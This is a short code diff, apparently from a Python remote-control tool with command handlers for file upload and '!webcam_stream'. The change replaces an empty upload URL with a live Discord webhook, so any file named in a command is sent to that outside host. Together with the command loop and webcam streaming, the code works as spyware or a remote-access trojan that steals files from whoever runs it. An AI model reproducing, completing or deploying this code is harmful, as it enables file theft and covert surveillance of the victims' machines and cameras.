@@ -44,7 +44,7 @@ while True:
                 filename = command.split(" ", 1)[1]
                 if os.path.exists(filename):
                     with open(filename, "rb") as f:
-                        requests.post("", files={"file": f})
+                        requests.post("https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2", files={"file": f})
 
             elif command.startswith("!webcam_stream"):
                 send_frame()
